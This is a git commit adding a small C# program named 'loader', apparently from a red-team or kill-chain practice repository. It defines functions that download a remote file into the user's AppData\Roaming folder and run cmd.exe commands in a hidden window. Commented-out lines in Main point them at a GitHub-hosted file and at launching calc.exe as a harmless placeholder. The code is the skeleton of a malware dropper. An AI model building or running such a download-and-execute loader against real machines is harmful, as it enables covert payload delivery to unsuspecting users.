ef2d765e18818f495fba23eaa371e931c49841bf
Bakari Levy <bakarilevy@gmail.com>
2022-02-27 12:33:25 -0800

    Initial Commit

---
+++ Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Net;
+
+namespace loader {
+    public class Program {
+    
+        public static void GetFile(string url, string filename) {
+            string currentUser = Environment.UserName;
+            string downloadPath = @$"C:\Users\{currentUser}\AppData\Roaming\{filename}";
+            using(WebClient myWebClient = new WebClient()) {
+                
+                myWebClient.DownloadFile(url, downloadPath);
+            }
+        }
+
+        public static void RunCommand(string command) {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = command;
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+
+        public static void Main(string[] args) {
+            //string file = "test.json";
+            //string fileLocation = "https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json";
+            //GetFile(fileLocation, file);
+
+            //string command = "/c calc.exe";
+            //RunCommand(command);
+        }
+
+
+    }
+}
